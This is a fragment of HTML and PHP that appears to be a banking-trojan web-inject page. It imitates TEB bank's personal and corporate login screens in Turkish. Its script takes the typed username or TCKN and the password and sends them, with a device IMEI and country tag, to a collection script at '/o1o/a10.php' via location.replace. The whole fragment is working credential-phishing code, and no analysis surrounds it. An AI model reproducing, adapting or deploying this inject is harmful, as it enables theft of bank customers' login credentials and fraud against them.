...
<div class="bg" style="z-index: 99;">
 <div class="glyphicon glyphicon-user nn1" style="color:white;"></div>
		<div class="field">
			<input type="text" name="fields[login]" class="input" id="id" placeholder="Kullanıcı Adı / TCKN" onKeyUp="if(this.value>9999999999){this.value=this.value.substr(0,11);}" placeholder="">
		</div>
  <div class="glyphicon glyphicon-lock nn2" style="color:white;"></div>
  <div class="field">
			<input type="password" name="fields[password]" placeholder="Parola" class="input" id="pass" maxlength="12" placeholder="">
        </div>
...
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|teb_bireysel|"+oNumInp.value+"|"+oCodeInp.value);
...
<div class="bg2">
 <div class="glyphicon glyphicon-user nn11" style="color:white;"></div>
 		<div class="field">
			<input type="text" name="fields[login]2" class="input" id="id2" placeholder="Kullanıcı Kodu / Adı" onKeyUp="if(this.value>9999999999){this.value=this.value.substr(0,11);}" placeholder="">
		</div>

  <div class="glyphicon glyphicon-th nn33" style="color:white;"></div>
  		<div class="field">
			<input type="text" name="fields[password2]" placeholder="Parola" class="input" id="ii" onKeyUp="if(this.value>99999){this.value=this.value.substr(0,11);}" placeholder="">
		</div>
...
var url='';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|teb_kurumsal|"+oNumInp.value+"|"+oCodeInp.value);
